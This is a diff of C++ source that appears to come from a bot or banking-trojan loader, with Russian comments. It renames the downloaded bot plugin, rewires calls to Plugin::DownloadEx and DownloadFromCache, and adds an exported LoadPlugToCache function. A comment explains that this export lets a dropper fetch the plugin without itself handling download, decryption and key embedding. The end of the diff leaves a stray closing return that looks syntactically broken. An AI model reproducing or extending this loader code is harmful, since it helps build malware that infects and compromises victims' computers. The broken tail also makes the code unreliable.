@@ -59,7 +59,7 @@ void DbgRptExplorerThread(void* Arguments)
 //----------------------------------------------------------------------------
 
 PWCHAR SVChostName = L"svchost.exe";
-char   BotPlugin[] =  "bktestma.plug";
+char   BotPluginName[] =  "bktestmb.plug";
 
 namespace DLLLoader
 {
@@ -170,7 +170,7 @@ namespace DLLLoader
 		PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("311_ld"));
 
 
-		Module = Plugin::DownloadEx(BotPlugin, NULL, &Size, true, true, NULL);
+		Module = Plugin::DownloadEx(BotPluginName, NULL, &Size, true, true, NULL);
 
 		LDRDBG("BRDS", "DownloadEx result module=0x%u", Module);
 
@@ -357,9 +357,9 @@ bool DoStartBotDll(PUSER_INIT_NOTIFY InitData, DWORD DelayBeforeStart)
 		return true;
 
 
-	LDRDBG("BRDS Explorer", "Читаем плагин из кэша ");
+	LDRDBG("BRDS Explorer", "Читаем плагин из кэша");
 	DWORD Size = 0;
-	LPBYTE Module = Plugin::DownloadFromCache(BotPlugin, true, NULL, &Size);
+	LPBYTE Module = Plugin::DownloadFromCache(BotPluginName, true, NULL, &Size);
 
 	if (Module != NULL)
 	{
@@ -482,35 +482,45 @@ extern"C" __declspec(dllexport) VOID NTAPI  Start(
 	}
 };
 
+// Нужен для вызова в дропере.
+// Чтобы не перетягивать всю работу по загрузке, расшифровке, встраиванию ключей и тд
+// в дропер - сделан експорт в Loader_dll и она уже должна скачать плаг, имея в себе 
+// всё, что для этого.
+// Получилось значительно быстрее и изящнее.
+
 BOOL WINAPI LoadPlugToCache(DWORD /*ReservedTimeout*/)
 {
-		DWORD Size = 0;
-		LPVOID Module = NULL;
+	DWORD Size = 0;
+	LPVOID Module = NULL;
 
-		//Загружаем библиотеку
-		LDRDBG("LoadPlugToCache", "Начинаем загрузку плагина!");
+	//Загружаем библиотеку
+	LDRDBG("LoadPlugToCache", "Начинаем загрузку плагина!");
 
-		// 315_ld начало загрузки файла плага методом LoadPlugToCache
-		PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("315_ld"));
+	// 315_ld начало загрузки файла плага методом LoadPlugToCache
+	PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("315_ld"));
 
-		Module = Plugin::DownloadEx(BotPlugin, NULL, &Size, true, true, NULL);
+	Module = Plugin::DownloadEx(BotPluginName, NULL, &Size, true, true, NULL);
 
-		LDRDBG("LoadPlugToCache", "DownloadEx result module=0x%u", Module);
+	LDRDBG("LoadPlugToCache", "DownloadEx result module=0x%u", Module);
 
-		// 316_ld окончание загрузки файла плага методом LoadPlugToCache
-		PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("316_ld"));
+	// 316_ld окончание загрузки файла плага методом LoadPlugToCache
+	PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("316_ld"));
 
-		if (Module != NULL)
-		{
-			// Сохраняем данные в кэш
-			LDRDBG("LoadPlugToCache", "Module successfuly loaded.");
-			
-			// 317_ld успешная загрузка файла плага методом LoadPlugToCache
-			PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("317_ld"));
-			
-			MemFree(Module);
-			return TRUE;
-		}
+	if (Module != NULL)
+	{
+		// Сохраняем данные в кэш
+		LDRDBG("LoadPlugToCache", "Module successfuly loaded.");
+		
+		// 317_ld успешная загрузка файла плага методом LoadPlugToCache
+		PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("317_ld"));
+		
+		MemFree(Module);
+		return TRUE;
+	}
+
+	return FALSE;
+}
+
 
 		return FALSE;
 }
